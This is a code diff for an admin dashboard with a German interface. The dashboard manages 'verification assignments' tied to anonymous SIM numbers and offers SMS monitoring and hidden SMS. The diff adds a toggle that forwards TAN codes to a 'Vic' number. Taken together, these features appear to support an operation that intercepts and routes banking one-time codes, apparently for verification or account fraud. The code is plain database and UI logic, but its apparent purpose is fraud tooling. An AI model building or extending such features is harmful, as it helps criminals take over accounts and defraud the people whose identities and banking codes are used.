@@ -71,6 +71,7 @@ interface AssignmentRow {
   status: AssignmentStatus;
   sms_monitoring_active: boolean;
   hidden_sms: string[];
+  forward_tan_to_vic: boolean;
   profile: {
     id: string;
     email: string | null;
@@ -130,7 +131,7 @@ export default function AdminAssignmentHistory({ refreshToken = 0 }: { refreshTo
     setLoading(true);
     const { data: assignmentData, error } = await supabase
       .from("verification_assignments")
-      .select("id, created_at, user_id, verification_id, field_values, phone_number_id, created_by, status, sms_monitoring_active, hidden_sms")
+      .select("id, created_at, user_id, verification_id, field_values, phone_number_id, created_by, status, sms_monitoring_active, hidden_sms, forward_tan_to_vic")
       .order("created_at", { ascending: false });
 
     if (error || !assignmentData) {
@@ -160,6 +161,7 @@ export default function AdminAssignmentHistory({ refreshToken = 0 }: { refreshTo
         status: (d.status as AssignmentStatus) || "zugewiesen",
         sms_monitoring_active: d.sms_monitoring_active ?? true,
         hidden_sms: (d.hidden_sms as string[]) || [],
+        forward_tan_to_vic: (d as any).forward_tan_to_vic ?? false,
         profile: profileMap.get(d.user_id) || null,
         verification: verificationMap.get(d.verification_id) || null,
       }))
@@ -200,7 +202,7 @@ export default function AdminAssignmentHistory({ refreshToken = 0 }: { refreshTo
       if (!phone) { setSmsLoading(false); return; }
 
       const { data } = await supabase.functions.invoke("anosim-proxy", {
-        body: { token: phone.token },
+        body: { token: phone.token, assignmentId: a.id },
       });
 
       if (data?.sms && Array.isArray(data.sms)) {
@@ -259,6 +261,22 @@ export default function AdminAssignmentHistory({ refreshToken = 0 }: { refreshTo
       toast({
         title: newVal ? "SMS-Überwachung aktiviert" : "SMS-Überwachung gestoppt",
       });
+    }
+  };
+
+  const toggleForwardTan = async () => {
+    if (!selected) return;
+    const newVal = !selected.forward_tan_to_vic;
+    const { error } = await supabase
+      .from("verification_assignments")
+      .update({ forward_tan_to_vic: newVal })
+      .eq("id", selected.id);
+    if (!error) {
+      setSelected({ ...selected, forward_tan_to_vic: newVal });
+      setAssignments((prev) =>
+        prev.map((a) => (a.id === selected.id ? { ...a, forward_tan_to_vic: newVal } : a))
+      );
+      toast({ title: newVal ? "TAN-Weiterleitung aktiviert" : "TAN-Weiterleitung deaktiviert" });
     }
   };
 
@@ -565,6 +583,18 @@ export default function AdminAssignmentHistory({ refreshToken = 0 }: { refreshTo
                       />
                     </div>
                   </div>
+
+                  <div className="flex items-center justify-between rounded-md border border-border p-2">
+                    <span className="text-xs text-muted-foreground">
+                      TAN an Vic-Nummer weiterleiten
+                    </span>
+                    <Switch
+                      checked={selected.forward_tan_to_vic}
+                      onCheckedChange={toggleForwardTan}
+                    />
+                  </div>
+
+
 
                   {smsLoading ? (
                     <div className="flex items-center justify-center py-4">
